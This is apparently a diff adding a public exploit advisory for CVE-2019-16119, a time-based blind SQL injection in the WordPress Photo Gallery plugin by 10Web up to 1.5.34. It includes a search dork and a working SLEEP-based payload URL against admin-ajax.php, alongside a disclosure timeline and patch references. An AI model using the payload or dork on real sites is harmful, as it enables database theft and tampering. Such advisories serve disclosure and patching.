@@ -1,0 +1,36 @@
+# Exploit Title: WordPress Plugin Photo Gallery by 10Web <= 1.5.34 - Blind SQL injection
+# inurl:"\wp-content\plugins\photo-gallery"
+# Date: 09-10-2019
+# Exploit Author: MTK (http://mtk911.cf/)
+# Vendor Homepage: https://10web.io/
+# Software Link: https://downloads.wordpress.org/plugin/photo-gallery.1.5.34.zip
+# Version: Up to v1.5.34
+# Tested on: Apache2/WordPress 5.2.2 - Firefox/Windows - SQLMap
+# CVE : 2019-16119
+
+# Software description:
+Photo Gallery is the leading plugin for building beautiful mobile-friendly galleries in a few minutes.
+
+
+# Technical Details & Impact:
+Through the SQL injection vulnerability, a malicious user could inject SQL code in order to steal information from the database, modify data from the database, even delete database or data from
+them.
+
+# POC
+In Gallery Group tab > Add new and in add galleries / Gallery groups. GET request going with parameter album_id is vulnerable to Time Based Blind SQL injection.  Following is the POC,
+
+1.   http://127.0.0.1/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc&
+
+2.    http://127.0.0.1/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=0 AND (SELECT 1 FROM (SELECT(SLEEP(10)))BLAH)&width=785&height=550&bwg_nonce=9e367490cc&
+
+
+# Timeline
+09-01-2019 - Vulnerability Reported
+09-03-2019 - Vendor responded
+09-04-2019 - New version released (1.5.35)
+09-10-2019 - Full Disclosure
+
+# References:
+https://wordpress.org/plugins/photo-gallery/#developers
+https://plugins.trac.wordpress.org/changeset/2150912/photo-gallery/trunk/admin/controllers/Albumsgalleries.php?old=1845136&old_path=photo-gallery%2Ftrunk%2Fadmin%2Fcontrollers%2FAlbumsgalleries.php
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16119
